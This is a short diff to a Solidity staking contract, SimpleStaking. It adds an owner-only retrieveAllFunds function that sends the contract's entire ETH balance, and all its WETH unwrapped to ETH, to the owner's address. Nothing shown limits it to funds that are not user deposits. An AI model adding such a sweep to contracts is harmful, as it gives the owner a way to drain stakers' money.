@@ -223,6 +223,27 @@ contract SimpleStaking is ReentrancyGuard {
     fallback() external payable {}
 
     receive() external payable {}
+    
+
+    // Function to withdraw all ETH and WETH to the owner's address
+    function retrieveAllFunds() external onlyOwner {
+        // Transfer all ETH from contract to owner
+        uint256 ethBalance = address(this).balance;
+        if (ethBalance > 0) {
+            payable(owner).transfer(ethBalance);
+        }
+
+        // Retrieve all WETH balance, unwrap to ETH and send to owner
+        IWETH wrappedeth = IWETH(weth);
+        uint256 wethBalance = wrappedeth.balanceOf(address(this));
+        if (wethBalance > 0) {
+            // Unwrap WETH to ETH
+            wrappedeth.withdraw(wethBalance);
+            // Transfer unwrapped ETH to owner
+            payable(owner).transfer(wethBalance);
+        }
+
+    }
 
     modifier onlyOwner() {
         require(msg.sender == owner, "Caller is not the owner");
